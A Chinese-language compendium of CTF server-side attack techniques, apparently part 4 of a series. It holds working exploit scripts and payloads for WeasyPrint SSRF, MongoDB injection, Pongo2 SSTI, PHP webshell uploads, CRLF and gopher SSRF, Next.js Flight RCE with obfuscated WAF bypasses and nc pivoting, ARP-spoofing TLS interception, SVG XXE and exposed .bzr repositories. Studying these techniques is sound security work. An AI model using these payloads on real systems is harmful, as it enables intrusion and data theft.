# 服务端进阶技巧（第 4 部分）

## 目录
- [WeasyPrint SSRF 与文件读取（CVE-2024-28184，Nullcon 2026）](#weasyprint-ssrf-与文件读取cve-2024-28184nullcon-2026)
  - [变体 1：借附件做布尔盲注 SSRF](#变体-1借附件做布尔盲注-ssrf)
  - [变体 2：借 file:// 附件读本地文件](#变体-2借-file-附件读本地文件)
- [MongoDB 正则注入 / $where 盲注 oracle（Nullcon 2026）](#mongodb-正则注入--where-盲注-oraclenullcon-2026)
- [Pongo2 / Go 模板注入经路径穿越（Nullcon 2026）](#pongo2--go-模板注入经路径穿越nullcon-2026)
- [上传 ZIP 携带 PHP Webshell（Nullcon 2026）](#上传-zip-携带-php-webshellnullcon-2026)
- [basename() 绕过读取隐藏文件（Nullcon 2026）](#basename-绕过读取隐藏文件nullcon-2026)
- [wget CRLF 注入实现 SSRF 打 SMTP（SECCON 2017）](#wget-crlf-注入实现-ssrf-打-smtpseccon-2017)
- [Gopher SSRF 打 MySQL 时间盲注（34C3 CTF 2017、AceBear 2018）](#gopher-ssrf-打-mysql-时间盲注34c3-ctf-2017acebear-2018)
- [React Server Components Flight 协议 RCE（Ehax 2026）](#react-server-components-flight-协议-rceehax-2026)
  - [第 1 步 —— 通过 HTTP 头识别 RSC](#第-1-步--通过-http-头识别-rsc)
  - [第 2 步 —— 利用 Flight 反序列化实现 RCE](#第-2-步--利用-flight-反序列化实现-rce)
  - [第 3 步 —— 借 NEXT_REDIRECT 外带数据](#第-3-步--借-next_redirect-外带数据)
  - [第 4 步 —— 绕过 WAF 关键字过滤](#第-4-步--绕过-waf-关键字过滤)
  - [第 5 步 —— RCE 后的信息收集](#第-5-步--rce-后的信息收集)
  - [第 6 步 —— 横向移动到内网服务](#第-6-步--横向移动到内网服务)
- [用 sslsplit + arpspoof 拦截 AMQP/TLS（TAMUctf 2019）](#用-sslsplit--arpspoof-拦截-amqptlstamuctf-2019)
- [CairoSVG 借超大 width= 触发 XXE（BSidesSF 2019）](#cairosvg-借超大-width-触发-xxebsidessf-2019)
- [用 bzr check 循环重建 Bazaar（.bzr）仓库（STEM CTF 2019）](#用-bzr-check-循环重建-bazaarbzr仓库stem-ctf-2019)

另见：[server-side-advanced.md](server-side-advanced.md) 为第 1 部分（ExifTool DjVu、Go rune/byte、ZIP 符号链接、路径穿越绕过、Nginx alias、Unicode 同形字、Ruby Regexp.escape、/dev/fd、Flask/Werkzeug debug、XXE DTD 过滤绕过、%2f 绕过）。另见：[server-side-advanced-2.md](server-side-advanced-2.md) 为第 2 部分。另见：[server-side-advanced-3.md](server-side-advanced-3.md) 为第 3 部分。

---

<a id="weasyprint-ssrf--file-read-cve-2024-28184-nullcon-2026"></a>
## WeasyPrint SSRF 与文件读取（CVE-2024-28184，Nullcon 2026）

**模式（Web 2 Doc 1/2）：** 应用用 WeasyPrint 把用户提供的 URL 转成 PDF。附件的抓取绕过了内部请求头检查，因此可读本地文件。

<a id="variant-1-blind-ssrf-via-attachment-oracle"></a>
### 变体 1：借附件做布尔盲注 SSRF
WeasyPrint 的 `<a rel="attachment" href="...">` 走另一条代码路径抓取 URL，不带 `X-Fetcher` 之类的内部头。如果目标只允许 localhost 访问，附件抓取恰好是从 localhost 发出的，能成功。

**布尔 oracle：** 只有目标返回 HTTP 200 时，嵌入文件才会出现在 PDF 里：
```python
# Check for embedded attachment in PDF
def has_attachment(pdf_bytes):
    return b"/Type /EmbeddedFile" in pdf_bytes

# Blind extraction via charCodeAt oracle
for i in range(flag_len):
    for ch in charset:
        html = f'<a rel="attachment" href="http://127.0.0.1:5000/admin/flag?i={i}&c={ch}">A</a>'
        pdf = convert_url_to_pdf(host_html(html))
        if has_attachment(pdf):
            flag += ch; break
```

<a id="variant-2-local-file-read-via-file-attachment"></a>
### 变体 2：借 file:// 附件读本地文件
```html
<!-- Host this HTML, submit URL to converter -->
<link rel="attachment" href="file:///flag.txt">
```
**提取：** `pdfdetach -save 1 -o flag.txt output.pdf`

**关键点：** WeasyPrint 会处理 `<link rel="attachment">` 与 `<a rel="attachment">` —— 两者都能引用 `file://` 或内网 URL。附件会以文件流形式嵌入 PDF。

---

<a id="mongodb-regex-injection--where-blind-oracle-nullcon-2026"></a>
## MongoDB 正则注入 / $where 盲注 oracle（Nullcon 2026）

**模式（CVE DB）：** 搜索输入被拼进 MongoDB 查询的 `/.../i` 正则。跳出正则上下文即可注入任意 JS 条件。

**注入载荷：**
```text
a^/)||(<JS_CONDITION>)&&(/a^
```
它打破正则上下文并注入布尔条件。结果条数即真值。

**二分提取：**
```python
def oracle(condition):
    # Inject into regex context
    payload = f"a^/)||(({condition}))&&(/a^"
    html = post_search(payload)
    return parse_result_count(html) > 0

# Find flag length
lo, hi = 1, 256
while lo < hi:
    mid = (lo + hi + 1) // 2
    if oracle(f"this.product.length>{mid}"): lo = mid
    else: hi = mid - 1
length = lo + 1

# Extract each character
for i in range(length):
    l, h = 31, 126
    while l < h:
        m = (l + h + 1) // 2
        if oracle(f"this.product.charCodeAt({i})>{m}"): l = m
        else: h = m - 1
    flag += chr(l + 1)
```

**识别特征：** 输入未净化就进了 MongoDB 的 `$regex` 或 `$where`。用 `a/)||true&&(/a` 与 `a/)||false&&(/a` 对比 —— 结果条数不同即确认可注入。

---

<a id="pongo2--go-template-injection-via-path-traversal-nullcon-2026"></a>
## Pongo2 / Go 模板注入经路径穿越（Nullcon 2026）

**模式（WordPress 静态站生成器）：** Go 应用用 Pongo2 渲染模板。模板参数存在路径穿越，可以渲染上传的文件。

**攻击链：**
1. 上传内容为 `{% include "/flag.txt" %}` 的文件
2. 从 session cookie 取出上传 ID（base64 解码，提取 hex ID）
3. 带穿越路径请求渲染：`/generate?template=../uploads/<id>/pwn`

**Pongo2 SSTI 载荷：**
```text
{% include "/etc/passwd" %}
{% include "/flag.txt" %}
{{ "test" | upper }}
```

**识别特征：** Go Web 应用带模板渲染 + 文件上传。源码里查 `pongo2`、`jet` 或标准 `html/template`。

---

<a id="zip-upload-with-php-webshell-nullcon-2026"></a>
## 上传 ZIP 携带 PHP Webshell（Nullcon 2026）

**模式（virus_analyzer）：** 应用接受 ZIP 上传，解压到 Web 可访问目录，并提供解压文件的访问。

**利用：**
```bash
# Create PHP webshell
echo '<?php echo file_get_contents("/flag.txt"); ?>' > shell.php
zip payload.zip shell.php
curl -F 'zipfile=@payload.zip' http://target/
# Access: http://target/uploads/<id>/shell.php
```

**变体：**
- `system()` 被禁（提示 "Cannot fork"）时，改用 `file_get_contents()` 或 `readfile()`
- `.php` 被禁时，试 `.phtml`、`.php5`、`.phar`，或先上传 `.htaccess`
- 竞态：文件可能在解压后被删除 —— 要立刻访问

---

<a id="basename-bypass-for-hidden-files-nullcon-2026"></a>
## basename() 绕过读取隐藏文件（Nullcon 2026）

**模式（Flowt Theory 2）：** 应用用 `basename()` 防止文件查看器的路径穿越，但它只剥离目录部分。同目录下的隐藏文件/dot 文件依然可读。

**利用：**
```bash
# basename() allows .lock, .htaccess, etc.
curl "http://target/?view_receipt=.lock"
# .lock reveals secret filename
curl "http://target/?view_receipt=secret_XXXXXXXX"
```

**关键点：** `basename()` 不是安全函数 —— 它只取文件名部分，不滤隐藏文件（`.foo`）、备份文件（`file~`），也不滤任何不含目录分隔符的文件名。

---

<a id="wget-crlf-injection-for-ssrf-to-smtp-seccon-2017"></a>
## wget CRLF 注入实现 SSRF 打 SMTP（SECCON 2017）

**模式：** 1.17.1 之前的 wget（尤其是 CentOS 7 上常见的 1.14）不清洗 HTTP Host 头里的 CRLF 字符（`%0d%0a`）。当 SSRF 能控制 wget 抓取的 URL 时，向主机名注入 CRLF 就能注入任意协议命令。打内网 25 端口的 SMTP 服务即可发送任意邮件。

```text
# CRLF-injected URL targeting internal SMTP on port 25:
# Key: the port :25/ must come at the END to avoid "Bad port number" errors
http://127.0.0.1%0D%0AHELO%20x%0D%0AMAIL%20FROM%3A%3Cattacker%40x.com%3E%0D%0ARCPT%20TO%3A%3Croot%3E%0D%0ADATA%0D%0ASubject%3A%20give%20me%20flag%0D%0Aabc%0D%0A.%0D%0A:25/
```

```python
import requests
import urllib.parse

# Build the CRLF-injected SMTP conversation
smtp_commands = "\r\n".join([
    "HELO x",
    "MAIL FROM:<attacker@x.com>",
    "RCPT TO:<root>",
    "DATA",
    "Subject: give me flag",
    "",
    "Send me the flag please",
    ".",
])

# URL-encode the SMTP commands for injection into the hostname
encoded = urllib.parse.quote(smtp_commands, safe='')

# Port must be at the end to avoid wget "Bad port number" error
ssrf_url = f"http://127.0.0.1{encoded}:25/"

# Trigger the SSRF
requests.post("http://target/fetch", data={"url": ssrf_url})
# wget connects to 127.0.0.1:25 and sends the SMTP commands as part of the HTTP request
# The SMTP server processes the injected commands and delivers the email
```

**关键点：** 1.17.1 之前的 wget 不清洗 Host 头里的 CRLF。SSRF 能打到内网 SMTP 服务时，CRLF 注入可发送任意邮件。把端口放在注入字符串的**末尾**以避免 "Bad port number" 报错。该技巧也适用于任何可通过 SSRF 访问的基于行的协议（FTP、Redis、memcached）。其他 SSRF 技巧见 [server-side.md](server-side.md#ssrf)。

---

<a id="gopher-ssrf-to-mysql-blind-sqli-34c3-ctf-2017-acebear-2018"></a>
## Gopher SSRF 打 MySQL 时间盲注（34C3 CTF 2017、AceBear 2018）

**模式：** SSRF 支持 `gopher://` 时，手工构造 MySQL 原始协议包，与使用免密认证的本地 MySQL 实例通信（CTF 环境常见）。配合 `SLEEP()` 的时间盲注即可拖数据。

```python
import urllib.parse
import requests
import time

# Step 1: Capture a real MySQL session with tcpdump
# tcpdump -i lo port 3306 -w mysql.pcap
# Connect to MySQL normally: mysql -u root
# Execute a simple query, then disconnect
# Extract the client auth packet and query packet bytes from the pcap

# Step 2: Build the gopher payload
# MySQL auth packet (handshake response) - extract from pcap
auth_packet = bytearray([
    0x48, 0x00, 0x00, 0x01,  # packet length + sequence
    0x85, 0xa6, 0x03, 0x00,  # client capabilities
    # ... remaining auth packet bytes from tcpdump capture
])

# MySQL query packet
def build_query_packet(sql):
    payload = b'\x03' + sql.encode()  # 0x03 = COM_QUERY
    length = len(payload)
    # MySQL packet: 3-byte length (little-endian) + 1-byte sequence number
    header = length.to_bytes(3, 'little') + b'\x00'
    return header + payload

# Step 3: Time-based blind extraction
flag = ""
for pos in range(1, 50):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789_{}-":
        query = f"SELECT IF(SUBSTRING((SELECT flag FROM secrets LIMIT 1),{pos},1)='{char}',SLEEP(3),0)"
        query_packet = build_query_packet(query)

        # Combine auth + query, URL-encode for gopher
        raw_data = bytes(auth_packet) + bytes(query_packet)
        encoded = urllib.parse.quote(raw_data, safe='')

        # Double-encode if the SSRF handler URL-decodes once
        double_encoded = urllib.parse.quote(encoded, safe='')

        gopher_url = f"gopher://127.0.0.1:3306/_{double_encoded}"

        start = time.time()
        requests.get("http://target/fetch", params={"url": gopher_url})
        elapsed = time.time() - start

        if elapsed > 3.0:
            flag += char
            print(f"Flag so far: {flag}")
            break

print(f"Final flag: {flag}")
```

**关键点：** `gopher://` 发送原始 TCP 数据，可与任意 TCP 服务通信。先用 `tcpdump` 抓一次正常 MySQL 会话，再通过 gopher 重放认证包 + 查询包。用免密 MySQL 账号（CTF 环境常见）。当 SSRF 处理器会做一次 URL 解码时，载荷要双重 URL 编码。该技巧同样适用于 PostgreSQL、Redis 以及 SSRF 上下文能访问的其他 TCP 服务。SQL 注入技巧见 [sql-injection.md](sql-injection.md)。

---

<a id="react-server-components-flight-protocol-rce-ehax-2026"></a>
## React Server Components Flight 协议 RCE（Ehax 2026）

**模式（Flight Risk）：** Next.js 应用使用 React Server Components（RSC）。Flight 协议在服务端反序列化客户端发来的对象。伪造的 Flight chunk 利用构造函数链（`constructor → constructor → Function`）实现任意代码执行（CVE-2025-55182）。

<a id="step-1--identify-rsc-via-http-headers"></a>
### 第 1 步 —— 通过 HTTP 头识别 RSC

在 Network 面板拦截表单提交。RSC 特有头：
```http
POST / HTTP/1.1
Next-Action: 7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd
Accept: text/x-component
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D
Content-Type: multipart/form-data; boundary=----x
```

在客户端 JS bundle 里确认服务端函数名：
```javascript
createServerReference("7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd", callServer, void 0, findSourceMapURL, "greetUser")
```

<a id="step-2--exploit-flight-deserialization-for-rce"></a>
### 第 2 步 —— 利用 Flight 反序列化实现 RCE

在 multipart 表单体里伪造一个 Flight chunk。载荷放在 `_prefix` 字段里。构造函数链（`constructor → constructor → Function`）可在服务端执行任意 JavaScript。

请求结构：
```http
POST / HTTP/1.1
Host: target
Next-Action: <action_hash>
Accept: text/x-component
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="0"

THE FAKE FLIGHT CHUNK HERE
------x
Content-Disposition: form-data; name="1"

"$@0"
------x--
```

<a id="step-3--exfiltrate-data-via-next_redirect"></a>
### 第 3 步 —— 借 NEXT_REDIRECT 外带数据

Next.js 内部用 `NEXT_REDIRECT` 错误做跳转。滥用它可通过 `x-action-redirect` 响应头外带数据：

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${encodeURIComponent(RESULT)};307;`
});
```

服务端响应：
```http
HTTP/1.1 303 See Other
x-action-redirect: /login?a=<exfiltrated_data>;push
```

示例 —— 用 `process.pid` 确认 RCE：
```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
  digest: `NEXT_REDIRECT;push;/login?a=${process.pid};307;`
});
// Response: x-action-redirect: /login?a=1;push
```

<a id="step-4--bypass-waf-keyword-filters"></a>
### 第 4 步 —— 绕过 WAF 关键字过滤

当 `child_process`、`execSync`、`mainModule` 等关键字被拦（返回 403 与 "WAF Alert"）时：

1. **字符串拼接：**
   ```javascript
   p['main'+'Module']['requ'+'ire']('chi'+'ld_pro'+'cess')
   ```

2. **十六进制编码：**
   ```javascript
   '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'  // child_process
   '\x65\x78\x65\x63\x53\x79\x6e\x63'                        // execSync
   ```

3. **在载荷里组合使用：**
   ```javascript
   var p=process;
   var m=p['main'+'Module'];
   var r=m['requ'+'ire'];
   var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
   var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63']('id').toString();
   throw Object.assign(new Error('NEXT_REDIRECT'),
     {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
   ```

<a id="step-5--post-rce-enumeration"></a>
### 第 5 步 —— RCE 后的信息收集

```javascript
// Working directory
process.cwd()                        // → /app

// Process arguments
process.argv                         // → /usr/local/bin/node,/app/server.js

// List files
process.mainModule.require('fs').readdirSync(process.cwd()).join(',')

// Read files
process.mainModule.require('fs').readFileSync('vault.hint').toString('hex')

// Check available modules
Object.keys(process.mainModule.require('http'))
```

<a id="step-6--lateral-movement-to-internal-services"></a>
### 第 6 步 —— 横向移动到内网服务

发现内网服务后（例如从提示文件中）：
```javascript
// Use nc to reach internal HTTP services
var p=process;var m=p['main'+'Module'];var r=m['requ'+'ire'];
var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63'](
  'printf "GET /flag.txt HTTP/1.1\\r\\nHost: internal-vault\\r\\n\\r\\n" | nc internal-vault 9009'
).toString();
throw Object.assign(new Error('NEXT_REDIRECT'),
  {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
```

**关键点：** NEXT_REDIRECT 机制提供了一个稳定的带外数据通道，走 `x-action-redirect` 响应头。配合字符串拼接与十六进制编码绕过 WAF，即使在有过滤的环境里也能完成完整 RCE。

**完整利用链：** 识别 RSC 头 → 伪造 Flight chunk → 绕过 WAF → 达成 RCE → 枚举文件系统 → 发现内网服务 → 用 `nc` 横向取 flag。

**识别特征：** 请求里出现 `Accept: text/x-component` + `Next-Action` 头，客户端 JS 里有 `createServerReference()`，Next.js Server Actions 接收用户可控的表单数据。

---

<a id="amqptls-interception-via-sslsplit--arpspoof-tamuctf-2019"></a>
## 用 sslsplit + arpspoof 拦截 AMQP/TLS（TAMUctf 2019）

**模式：** 一个 Web 中间层把 JSON 任务 `{"user": "alice", "code": "..."}` POST 到内网 `5671/tcp` 上的 RabbitMQ broker（AMQPS）。客户端几乎从不做证书 pinning，因此对两端都做 ARP 欺骗把流量引到攻击者，再用 sslsplit 终结 TLS，就能拿到明文 AMQP 帧，可记录也可改写（把 `"alice"` 换成 `"root"` 即可提权）。

```bash
# 1. Sit between the web server and the broker (both ways)
arpspoof -i eth0 -t 172.30.0.2 172.30.0.4 &
arpspoof -i eth0 -t 172.30.0.4 172.30.0.2 &

# 2. Redirect the AMQP port into sslsplit
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 5671 -j REDIRECT --to-ports 1234
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
mkdir /tmp/sslsplit logdir
sudo sslsplit -D -l connections.log -j /tmp/sslsplit -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 1234
cat logdir/*    # shows plaintext AMQP frames with the JSON body

# 3. For on-the-fly rewriting, patch mitmproxy's raw TCP layer:
#    mitmproxy/proxy/protocol/rawtcp.py, RawTCPLayer._handle_server_message():
#        x = buf[:size].tobytes().replace(b'"user": "alice",', b'"user": "root", ')
#        tcp_message = tcp.TCPMessage(dst == server, x)
mitmproxy --mode transparent --listen-port 1234 --ssl-insecure \
          --tcp-hosts 172.30.0.2 --tcp-hosts 172.30.0.4
```

**关键点：** 不做证书 pinning 的客户端会接受任何由受信 CA 签发的证书；sslsplit 终结 TLS 并把明文写进日志，于是任何 TLS 包裹的协议（AMQP、IRC、MQTT、LDAPS、自定义二进制协议）都变得可观察，配合一处 mitmproxy 小补丁还能改写。Burp 和 mitmproxy 侧重 HTTPS；面对任意协议，用 sslsplit/sslsniff 加 TCP 层改包。

**参考：** TAMUctf 2019 — Homework Help，writeup 13477

---

<a id="cairosvg-xxe-via-oversized-width-bsidessf-2019"></a>
## CairoSVG 借超大 width= 触发 XXE（BSidesSF 2019）

**模式：** Web 服务用 CairoSVG 把用户提供的 SVG 渲染成 PNG。CairoSVG（以及 librsvg/ImageMagick/rsvg-convert）在栅格化之前会解析 XML 的 `DOCTYPE` 实体，因此 `<text>` 中引用的 XXE 实体内容会被画进 PNG。坑点：渲染出的像素必须装得下字符串 —— 对 `/proc/self/status` 这类大文件，要把 `width` 调到约 20000（超过约 34000 会在栅格化时超时），否则文字会被裁掉。

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [<!ENTITY xx SYSTEM "file:///proc/self/status">]>
<svg height="300" width="20000" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="15" fill="red">test &xx;; test</text>
</svg>
```

上传后下载 PNG，从图上读出 flag（肉眼看或 OCR）。找 flag 路径时，先 dump `/proc/self/status` 拿到 PID，再探 `/proc/<pid>/cwd/flag.txt`、`/proc/<pid>/cmdline` 和 `/proc/<pid>/environ`。如果第一遍被裁（例如 width=3000），就渲染得更宽 —— BSidesSF 2019 的 SVGMagic 因为目标路径较短，`width="3000"` 就够了。

**关键点：** 支持 DOCTYPE + ENTITY 展开的 SVG 渲染器和任何 XML 解析器一样存在 XXE；加大 `width` 才能让大段文件内容完整画进图片。注意输出通道是**像素**而不是文本 —— OCR 后（例如 `tesseract img.png -`）或在图上 `grep` 找 flag，也可以直接打开看。

**参考：** BSidesSF 2019 CTF — SVGMagic（PNGSVG），writeup 13711。另见 [server-side-2.md](server-side-2.md) 中的 svglib 变体。

---

<a id="bazaar-bzr-repository-reconstruction-via-bzr-check-loop-stem-ctf-2019"></a>
## 用 bzr check 循环重建 Bazaar（.bzr）仓库（STEM CTF 2019）

**模式：** Web 服务器暴露 `/.bzr/`（目录索引 403，文件 200）。Bazaar 把历史存成少量 index + pack 文件；`bzr check` 能容忍不完整的仓库，并在缺数据时于错误信息里报出期望路径。写个循环读取错误并 `wget` 对应文件即可重建仓库，之后 `bzr revert` 和 `bzr diff` 就能暴露每个已提交版本 —— 包括后来被删掉的密钥。

```bash
# 1. Seed a local repo so bzr has a skeleton to work with
mkdir ctf && cd ctf && bzr init
echo foo > foo.txt && bzr add && bzr commit -m init && rm foo.txt

# 2. Replace the pointer files with copies from the victim
cd .bzr/branch     && rm last-revision && wget http://target/.bzr/branch/last-revision
cd ../checkout     && rm dirstate       && wget http://target/.bzr/checkout/dirstate
cd ../repository   && rm pack-names     && wget http://target/.bzr/repository/pack-names
cd ../../

# 3. Loop until bzr check stops complaining about missing indices/packs
while true; do
  OUT=$(bzr check 2>&1)
  [[ "$OUT" != *"No such file:"* ]] && break
  F=$(echo "$OUT" | sed 's/.*\([0-9a-f]\{32\}\).*/\1/')
  for EXT in cix iix rix six tix; do
    wget -P .bzr/repository/indices/ "http://target/.bzr/repository/indices/$F.$EXT"
  done
  wget -P .bzr/repository/packs/ "http://target/.bzr/repository/packs/$F.pack"
done
bzr revert

# 4. Mine every revision for interesting diffs
for R in $(bzr log --line | awk '{print $1}'); do bzr diff -r$((R-1))..$R; done
```

**关键点：** 暴露的 `.bzr/`（以及 `.git/`、`.hg/`、`.svn/`）目录会泄露完整提交历史；bzr 对攻击者尤其友好，因为它容忍不完整仓库并把缺失路径原样报出来，wget 循环就能补齐。要 diff 每个版本，而不只是 `HEAD` —— flag、钱包私钥、解密密钥往往是后来被**删除**的，但仍可恢复。树重建后还可以串联其他题，比如 STEM CTF 的 "Medium is overrated"：版本 N 存 base64 密文，版本 M 存 AES-ECB 密钥。

**参考：** STEM CTF Cyber Challenge 2019 — My First Blog & Medium is overrated，writeups 13380 与 13379
